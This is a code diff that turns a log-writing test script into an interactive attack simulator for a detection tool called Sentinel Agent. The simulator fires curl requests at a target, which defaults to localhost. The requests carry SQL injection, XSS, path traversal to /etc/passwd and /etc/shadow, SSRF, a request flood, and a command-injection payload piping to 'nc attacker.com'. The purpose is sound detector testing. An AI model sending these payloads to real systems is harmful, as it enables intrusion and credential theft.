@@ -1,219 +1,276 @@
-"""
-Test Attack Generator for Sentinel Agent
-Generates simulated attack logs to test the detection system
-"""
-
-import os
-import sys
+import subprocess
 import time
-import random
-from datetime import datetime, timedelta
-from pathlib import Path
-import logging
+import sys
+import os
 
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
+TARGET = os.getenv("TEST_TARGET", "http://localhost:80")
+
+ATTACKS = {
+    "1": {
+        "name": "SQL Injection",
+        "description": "Injects SQL commands via URL parameters",
+        "expected_detection": "SQL Injection | Severity: HIGH",
+        "requests": [
+            ("GET", f"{TARGET}/search?q=admin'%20UNION%20SELECT%20*%20FROM%20users--", None, None),
+            ("GET", f"{TARGET}/products?id=1%20DROP%20TABLE%20users", None, None),
+            ("POST", f"{TARGET}/login", "username=admin'%20OR%20'1'='1&password=test", None),
+        ]
+    },
+    "2": {
+        "name": "Cross-Site Scripting (XSS)",
+        "description": "Injects JavaScript via URL parameters",
+        "expected_detection": "Stored XSS | Severity: HIGH",
+        "requests": [
+            ("GET", f"{TARGET}/search?q=<script>alert('xss')</script>", None, None),
+            ("GET", f"{TARGET}/comment?text=<img%20src=x%20onerror=alert(1)>", None, None),
+            ("GET", f"{TARGET}/input?val=javascript:alert('xss')", None, None),
+            ("GET", f"{TARGET}/profile?name=<script>document.cookie</script>", None, None),
+        ]
+    },
+    "3": {
+        "name": "Command Injection",
+        "description": "Injects shell commands via URL parameters",
+        "expected_detection": "Command Injection | Severity: CRITICAL",
+        "requests": [
+            ("GET", f"{TARGET}/ping?host=localhost;cat%20/etc/passwd", None, None),
+            ("GET", f"{TARGET}/exec?cmd=$(whoami)", None, None),
+            ("GET", f"{TARGET}/run?input=test|nc%20attacker.com%2080", None, None),
+        ]
+    },
+    "4": {
+        "name": "Directory Traversal",
+        "description": "Attempts to access files outside web root",
+        "expected_detection": "Directory Traversal | Severity: HIGH",
+        "requests": [
+            ("GET", f"{TARGET}/file?path=../../etc/passwd", None, None),
+            ("GET", f"{TARGET}/download?file=..%2F..%2F..%2Fetc%2Fshadow", None, None),
+            ("GET", f"{TARGET}/read?name=../../../../proc/self/environ", None, None),
+        ]
+    },
+    "5": {
+        "name": "SSRF (Server-Side Request Forgery)",
+        "description": "Forces server to make requests to internal resources",
+        "expected_detection": "SSRF | Severity: CRITICAL",
+        "requests": [
+            ("GET", f"{TARGET}/proxy?url=http://127.0.0.1:8000/api/health", None, None),
+            ("GET", f"{TARGET}/fetch?target=file:///etc/passwd", None, None),
+            ("GET", f"{TARGET}/load?src=http://0.0.0.0/internal", None, None),
+        ]
+    },
+    "6": {
+        "name": "Automated Scanner",
+        "description": "Simulates known scanner tool signatures via User-Agent",
+        "expected_detection": "Automated Scanner | Severity: HIGH",
+        "requests": [
+            ("GET", f"{TARGET}/", None, "sqlmap/1.5.2"),
+            ("GET", f"{TARGET}/", None, "Nikto/2.1.5"),
+            ("GET", f"{TARGET}/admin", None, "python-requests/2.28.0"),
+            ("GET", f"{TARGET}/", None, "Nuclei - Open-source project"),
+        ]
+    },
+    "7": {
+        "name": "DDoS (High Request Rate)",
+        "description": "Sends 60 rapid concurrent requests to trigger rate detection",
+        "expected_detection": "DDoS Attack | Severity: CRITICAL",
+        "requests": None  # Special case -- handled separately
+    },
+    "8": {
+        "name": "SSH Brute Force",
+        "description": "Injects SSH failed login lines into auth.log",
+        "expected_detection": "SSH Brute Force | Severity: HIGH",
+        "requests": None  # Special case -- handled separately
+    },
+    "9": {
+        "name": "CSRF Attack",
+        "description": "Sends requests with null Origin/Referer headers",
+        "expected_detection": "CSRF | Severity: MEDIUM",
+        "requests": [
+            ("POST", f"{TARGET}/transfer", "amount=9999&to=attacker", None),
+            ("POST", f"{TARGET}/settings", "email=hacker@evil.com", None),
+        ]
+    },
+    "10": {
+        "name": "Directory Enumeration",
+        "description": "Scans common admin and config paths",
+        "expected_detection": "Automated Scanner | Severity: HIGH",
+        "requests": [
+            ("GET", f"{TARGET}/admin", None, None),
+            ("GET", f"{TARGET}/wp-admin", None, None),
+            ("GET", f"{TARGET}/phpmyadmin", None, None),
+            ("GET", f"{TARGET}/.env", None, None),
+            ("GET", f"{TARGET}/config.php", None, None),
+            ("GET", f"{TARGET}/.git/config", None, None),
+            ("GET", f"{TARGET}/shell.php", None, None),
+            ("GET", f"{TARGET}/backup.sql", None, None),
+        ]
+    },
+    "0": {
+        "name": "Run ALL attacks in sequence",
+        "description": "Runs all 10 attack types one after another",
+        "requests": None
+    }
+}
 
 
-def _is_docker() -> bool:
-    """Detect if running inside a Docker container."""
-    if os.path.exists("/.dockerenv"):
-        return True
+def send_request(method, url, data=None, user_agent=None):
+    """Send a single HTTP request and print what is being sent."""
+    cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
+           "--max-time", "5", "-X", method]
+
+    if user_agent:
+        cmd += ["-A", user_agent]
+        print(f"  Request : {method} {url}")
+        print(f"  Header  : User-Agent: {user_agent}")
+    else:
+        print(f"  Request : {method} {url}")
+
+    if data:
+        cmd += ["--data", data]
+        print(f"  Body    : {data}")
+
+    cmd.append(url)
+
     try:
-        with open("/proc/self/cgroup", "r", encoding="utf-8") as f:
-            return "docker" in f.read()
-    except OSError:
-        return False
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        status = result.stdout.strip()
+        print(f"  Response: HTTP {status}")
+    except subprocess.TimeoutExpired:
+        print("  Response: timeout")
+    except Exception as e:
+        print(f"  Response: error -- {e}")
 
 
-def _resolve_writable_log_path(path: str, docker_fallback: str, local_fallback: str = None) -> str:
-    """Resolve a writable log path, with fallbacks for different environments."""
-    if local_fallback is None:
-        local_fallback = "./logs/" + os.path.basename(docker_fallback)
-    
-    if not path or path.isspace():
-        path = docker_fallback
-    
-    # If running in Docker, use Docker fallback if not writable
-    if _is_docker():
-        target_dir = os.path.dirname(path) or "."
+def run_ddos():
+    """Send 60 concurrent requests."""
+    print(f"  Sending 60 concurrent requests to {TARGET}/")
+    print(f"  This will trigger the DDoS threshold (50 req/10s)")
+    procs = []
+    for i in range(60):
+        cmd = ["curl", "-s", "-o", "/dev/null", "--max-time", "5", f"{TARGET}/"]
+        procs.append(subprocess.Popen(cmd))
+    for p in procs:
         try:
-            if os.access(target_dir, os.W_OK):
-                # Can write to system logs in Docker - use original path
-                return path
+            p.wait(timeout=10)
         except Exception:
-            pass
-        return docker_fallback
-    
-    # Not in Docker - check if we can write to the requested path
+            p.kill()
+    print(f"  Sent: 60 concurrent requests")
+
+
+def run_ssh_brute_force():
+    """Inject SSH brute force lines into auth.log via docker exec."""
+    print("  Injecting 10 SSH brute force lines into /var/log/auth.log")
+    print("  Log line: Failed password for root from 203.0.113.99 port XXXXX ssh2")
+
+    script = """
+for i in $(seq 1 10); do
+    echo "$(date '+%b %d %H:%M:%S') server sshd[$$]: Failed password for root from 203.0.113.99 port 4444$i ssh2" >> /var/log/auth.log
+    sleep 0.2
+done
+echo "Done"
+"""
     try:
-        target_dir = os.path.dirname(path) or "."
-        if os.path.exists(path):
-            if os.access(path, os.W_OK):
-                return path
-        elif os.access(target_dir, os.W_OK):
-            return path
-    except Exception:
-        pass
-    
-    # Can't write to requested path - use local fallback
-    os.makedirs(os.path.dirname(local_fallback), exist_ok=True)
-    return local_fallback
+        result = subprocess.run(
+            ["docker", "exec", "sentinel-agent", "bash", "-c", script],
+            capture_output=True, text=True, timeout=30
+        )
+        if result.returncode == 0:
+            print("  Injected: 10 lines into auth.log")
+        else:
+            print(f"  Error: {result.stderr.strip()}")
+            print("  Make sure Docker container is running: docker-compose up -d")
+    except FileNotFoundError:
+        print("  Error: docker command not found")
+    except Exception as e:
+        print(f"  Error: {e}")
 
 
-class TestAttackGenerator:
-    """Generates simulated attacks for testing the Sentinel Agent"""
+def watch_logs(seconds=5):
+    """Watch docker logs for ATTACK lines."""
+    print(f"\n  Watching sentinel logs for {seconds} seconds...")
+    print("  " + "-" * 50)
+    try:
+        result = subprocess.run(
+            ["docker", "logs", "--tail", "50", "sentinel-agent"],
+            capture_output=True, text=True, timeout=10
+        )
+        lines = result.stdout.split("\n") + result.stderr.split("\n")
+        attack_lines = [
+            l for l in lines
+            if any(tag in l for tag in ["[ATTACK]", "[BAN]", "[FIREWALL]", "[REPEAT]", "[AUTO]"])
+        ]
+        if attack_lines:
+            for line in attack_lines[-10:]:
+                print(f"  LOG: {line}")
+        else:
+            print("  No [ATTACK] lines found yet -- may take a moment")
+            print("  Run: docker-compose logs -f sentinel-agent | grep ATTACK")
+    except Exception as e:
+        print(f"  Could not read logs: {e}")
+    print("  " + "-" * 50)
 
-    __test__ = False
-    
-    # Common attacking IPs to use
-    ATTACKING_IPS = [
-        "192.168.1.100",
-        "10.76.250.210",
-        "10.0.0.50",
-        "172.16.0.25",
-        "203.0.113.42",
-        "198.51.100.88",
-        "192.0.2.12",
-        "198.51.100.199",
-        "203.0.113.75",
-    ]
-    
-    # Auth log attack patterns
-    AUTH_LOG_ATTACKS = [
-        "Failed password for root from {ip} port 22 ssh2",
-        "Invalid user admin from {ip} port 22",
-        "Failed password for invalid user test from {ip} port 22 ssh2",
-        "authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user=root",
-        "authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user=admin",
-        "Failed password for {ip} port 22 ssh2 [preauth]",
-    ]
-    
-    # Web log attack patterns
-    WEB_LOG_ATTACKS = [
-        '{ip} - - [{timestamp}] "GET /admin HTTP/1.1" 401 1234 "-" "Mozilla/5.0 (scanning)"',
-        '{ip} - - [{timestamp}] "POST /login HTTP/1.1" 200 5678 "-" "python-requests/2.28.0"',
-        '{ip} - - [{timestamp}] "GET /index.php?id=1\' OR \'1\'=\'1 HTTP/1.1" 200 1234',
-        '{ip} - - [{timestamp}] "GET / HTTP/1.1" 403 0 "-" "-"',
-        '{ip} - - [{timestamp}] "POST /api/users HTTP/1.1" 401 1234',
-        '{ip} - - [{timestamp}] "GET /../../../etc/passwd HTTP/1.1" 400 0',
-    ]
-    
-    def __init__(self,
-                 auth_log_path: str = "/var/log/auth.log",
-                 web_log_path: str = "/var/log/apache2/access.log"):
-        resolved_auth = _resolve_writable_log_path(auth_log_path, "/app/logs/auth.log")
-        resolved_web = _resolve_writable_log_path(web_log_path, "/app/logs/access.log")
-        self.auth_log_path = Path(resolved_auth)
-        self.web_log_path = Path(resolved_web)
-        self.attack_count = 0
-    
-    def generate_auth_log_attacks(self, count: int = 10):
-        """Generate simulated auth log attacks"""
-        logger.info(f"Generating {count} auth log attacks...")
-        
-        # Ensure log file exists
-        self.auth_log_path.parent.mkdir(parents=True, exist_ok=True)
-        
-        try:
-            with open(self.auth_log_path, 'a', encoding='utf-8') as f:
-                for i in range(count):
-                    ip = random.choice(self.ATTACKING_IPS)
-                    pattern = random.choice(self.AUTH_LOG_ATTACKS)
-                    timestamp = (datetime.now() - timedelta(seconds=random.randint(0, 3600))).strftime("%b %d %H:%M:%S")
-                    
-                    # Format the log entry
-                    log_entry = pattern.format(ip=ip, timestamp=timestamp)
-                    if not log_entry.startswith(timestamp):
-                        log_entry = f"{timestamp} ubuntu {log_entry}"
-                    
-                    f.write(log_entry + "\n")
-                    logger.info(f"  [{i+1}/{count}] {ip} - brute force")
-                    self.attack_count += 1
-                    time.sleep(0.1)  # Small delay between entries
-            
-            logger.info(f"✓ Generated {count} auth log attacks")
-        except Exception as e:
-            logger.error(f"✗ Error writing to auth.log: {e}")
-    
-    def generate_web_log_attacks(self, count: int = 10):
-        """Generate simulated web log attacks"""
-        logger.info(f"Generating {count} web log attacks...")
-        
-        # Ensure log file exists
-        self.web_log_path.parent.mkdir(parents=True, exist_ok=True)
-        
-        try:
-            with open(self.web_log_path, 'a', encoding='utf-8') as f:
-                for i in range(count):
-                    ip = random.choice(self.ATTACKING_IPS)
-                    timestamp = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
-                    pattern = random.choice(self.WEB_LOG_ATTACKS)
-                    
-                    log_entry = pattern.format(ip=ip, timestamp=timestamp)
-                    
-                    f.write(log_entry + "\n")
-                    logger.info(f"  [{i+1}/{count}] {ip} - web attack")
-                    self.attack_count += 1
-                    time.sleep(0.1)
-            
-            logger.info(f"✓ Generated {count} web log attacks")
-        except Exception as e:
-            logger.error(f"✗ Error writing to web log: {e}")
-    
-    def generate_all_attacks(self, auth_count: int = 15, web_count: int = 15):
-        """Generate all test attacks"""
-        logger.info("")
-        logger.info("=" * 60)
-        logger.info("SENTINEL AGENT TEST ATTACK GENERATOR")
-        logger.info("=" * 60)
-        logger.info("")
-        
-        self.generate_auth_log_attacks(auth_count)
-        logger.info("")
-        self.generate_web_log_attacks(web_count)
-        
-        logger.info("")
-        logger.info("=" * 60)
-        logger.info(f"✓ GENERATED {self.attack_count} TOTAL ATTACKS")
-        logger.info("=" * 60)
-        logger.info("")
-        logger.info("Next steps:")
-        logger.info("1. The Sentinel Agent will detect these attacks")
-        logger.info("2. Check the dashboard for detected incidents")
-        logger.info("3. Monitor /app/logs/sentinel.log for results")
-        logger.info("")
 
-        if _is_docker() and ("/app/logs" in str(self.auth_log_path) or "/app/logs" in str(self.web_log_path)):
-            logger.info("NOTE: Using /app/logs for test data. Ensure sensors read the same paths:")
-            logger.info("  AUTH_LOG_PATH=/app/logs/auth.log")
-            logger.info("  WEB_LOG_PATH=/app/logs/access.log")
+def run_attack(key):
+    """Run a single attack by key."""
+    attack = ATTACKS[key]
+    print(f"\n{'='*60}")
+    print(f"  ATTACK: {attack['name']}")
+    print(f"  INFO  : {attack['description']}")
+    print(f"  EXPECT: {attack.get('expected_detection', 'varies')}")
+    print(f"{'='*60}")
+
+    if key == "7":
+        run_ddos()
+    elif key == "8":
+        run_ssh_brute_force()
+    elif attack["requests"]:
+        for i, req in enumerate(attack["requests"], 1):
+            method, url, data, ua = req
+            print(f"\n  --- Request {i}/{len(attack['requests'])} ---")
+            send_request(method, url, data, ua)
+            time.sleep(0.5)
+
+    time.sleep(2)
+    watch_logs(seconds=3)
+
+
+def print_menu():
+    """Print the attack selection menu."""
+    print("\n" + "="*60)
+    print("  SENTINEL AGENT - ATTACK SIMULATOR")
+    print("="*60)
+    for key, attack in ATTACKS.items():
+        if key == "0":
+            print(f"\n  [0] {attack['name']}")
+        else:
+            print(f"  [{key}] {attack['name']}")
+    print("\n  [q] Quit")
+    print("="*60)
 
 
 def main():
-    """Main entry point"""
-    import argparse
-    
-    parser = argparse.ArgumentParser(description="Generate test attacks for Sentinel Agent")
-    parser.add_argument("--auth-count", type=int, default=15, help="Number of auth log attacks to generate")
-    parser.add_argument("--web-count", type=int, default=15, help="Number of web log attacks to generate")
-    parser.add_argument("--auth-log", default=os.getenv("AUTH_LOG_PATH", "/var/log/auth.log"), help="Path to auth.log")
-    parser.add_argument("--web-log", default=os.getenv("WEB_LOG_PATH", "/var/log/apache2/access.log"), help="Path to web access log")
-    
-    args = parser.parse_args()
-    
-    generator = TestAttackGenerator(
-        auth_log_path=args.auth_log,
-        web_log_path=args.web_log
-    )
-    
-    generator.generate_all_attacks(
-        auth_count=args.auth_count,
-        web_count=args.web_count
-    )
+    print("\nSentinel Attack Simulator")
+    print("Make sure Sentinel is running: docker-compose up -d")
+    print(f"Target: {TARGET}")
+
+    while True:
+        print_menu()
+        choice = input("\nSelect attack type: ").strip().lower()
+
+        if choice == "q":
+            print("Exiting.")
+            break
+        elif choice == "0":
+            print("\nRunning all attacks in sequence...")
+            for key in [str(i) for i in range(1, 11)]:
+                run_attack(key)
+                print(f"\nWaiting 3 seconds before next attack...")
+                time.sleep(3)
+            print("\nAll attacks complete.")
+        elif choice in ATTACKS:
+            run_attack(choice)
+            input("\nPress Enter to return to menu...")
+        else:
+            print("Invalid choice. Please select a number from the menu.")
 
 
 if __name__ == "__main__":
